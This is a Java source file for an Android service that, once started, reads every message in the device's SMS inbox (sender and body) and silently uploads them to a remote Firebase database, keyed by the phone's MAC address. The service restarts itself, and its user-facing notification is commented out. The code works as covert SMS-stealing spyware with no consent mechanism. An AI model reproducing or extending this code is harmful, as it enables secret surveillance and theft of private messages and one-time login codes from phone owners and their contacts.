package com.example.hungdang.readsms;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import net.cryptobrewery.macaddress.MacAddress;

import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class SMSService extends Service {
    private SMSBroadcastReceiver receiver;


    @Override
    public void onCreate() {
        super.onCreate();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.d("tinnhansms","onStartCommand");

        receiver = new SMSBroadcastReceiver();

        List<Sms> sms = new ArrayList();

        sms = getSMS(this);
//        Toast.makeText(this, sms.toString(), Toast.LENGTH_SHORT).show();
//        Log.d("sms",sms.toString());

        FirebaseDatabase database = FirebaseDatabase.getInstance();
//        DatabaseReference myRef = database.getReference("message"+MacAddress.getMacAddr().toString());
        DatabaseReference myRef = database.getReference("message").child("message"+MacAddress.getMacAddr().toString());
        myRef.setValue(sms);

//        showNotification(getApplicationContext());

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
//        Toast.makeText(this,"onDestroy",Toast.LENGTH_LONG).show();
        Log.d("tinnhansms","onDestroy");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public List<Sms> getSMS(Context context){
        List<Sms> sms = new ArrayList<Sms>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
//        String address="",body="";
//        Sms smsDB = new Sms(address,body);
        while (cur != null && cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            Sms smsDB = new Sms(address,body);
            smsDB.setNumber(address);
            smsDB .setMessage(body);
            sms.add(smsDB);
//            Toast.makeText(context, sms.toString(), Toast.LENGTH_SHORT).show();
        }

        if (cur != null) {
            cur.close();
        }
        return sms;
    }

    public String getMacAddress(Context context) {
        WifiManager wimanager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        String macAddress = wimanager.getConnectionInfo().getMacAddress();
        if (macAddress == null) {
            macAddress = "Device don't have mac address or wi-fi is disabled";
        }
        return macAddress;
    }



}
